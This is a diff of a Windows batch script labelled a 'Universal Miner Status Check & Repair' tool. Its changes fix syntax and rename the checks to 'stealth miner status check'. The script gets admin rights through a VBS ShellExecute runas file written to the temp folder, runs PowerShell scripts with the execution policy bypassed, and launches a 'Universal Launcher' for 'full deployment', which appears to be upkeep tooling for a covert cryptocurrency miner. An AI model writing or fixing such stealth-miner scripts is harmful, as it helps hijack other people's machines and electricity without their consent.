@@ -1,20 +1,21 @@
 @echo off
+setlocal enabledelayedexpansion
 title System Status Check & Repair - FIXED VERSION
 color 0A
 
 echo.
 echo =====================================================
-echo   UNIVERSAL MINER STATUS CHECK & REPAIR
+echo   UNIVERSAL MINER STATUS CHECK ^& REPAIR
 echo =====================================================
 echo.
 
 REM Check if running as admin
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-if '%errorlevel%' neq '0' (
+if !errorlevel! neq 0 (
     echo [!] Requesting admin privileges for repair...
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
-    cscript //NoLogo "%temp%\elevate.vbs"
+    "%temp%\elevate.vbs"
     del "%temp%\elevate.vbs" >nul 2>&1
     exit /b
 )
@@ -29,29 +30,29 @@ echo [1] Quick Status Check Only
 echo [2] Status Check + Auto Repair
 echo [3] Full Deployment (Universal Launcher)
 echo.
-set /p choice="Enter your choice (1-3): "
+set /p "choice=Enter your choice (1-3): "
 
-if "%choice%"=="1" goto :status_only
-if "%choice%"=="2" goto :status_repair
-if "%choice%"=="3" goto :full_deployment
+if "!choice!"=="1" goto :status_only
+if "!choice!"=="2" goto :status_repair
+if "!choice!"=="3" goto :full_deployment
 goto :status_repair
 
 :status_only
 echo.
-echo [*] Running status check only...
-powershell.exe -ExecutionPolicy Bypass -Command "& '%~dp0status_checker_fixed.ps1'"
+echo [*] Running stealth miner status check...
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "& '%~dp0stealth_status_check.ps1'"
 goto :end
 
 :status_repair
 echo.
-echo [*] Running status check with auto-repair...
-powershell.exe -ExecutionPolicy Bypass -Command "& '%~dp0status_checker_fixed.ps1' -Repair"
+echo [*] Running stealth miner status check with auto-repair...
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "& '%~dp0stealth_status_check.ps1' -Repair"
 goto :end
 
 :full_deployment
 echo.
 echo [*] Launching Universal Launcher for full deployment...
-start "" "%~dp0UNIVERSAL_LAUNCHER.bat"
+start "Universal Launcher" "%~dp0UNIVERSAL_LAUNCHER.bat"
 goto :end
 
 :end
@@ -66,4 +67,5 @@ echo     • For full setup: Run UNIVERSAL_LAUNCHER.bat as admin
 echo     • For mining: Choose Option 1, 6, or 7 in Universal Launcher
 echo     • The PowerShell syntax error has been FIXED!
 echo.
-pause
+echo Press any key to continue...
+pause >nul
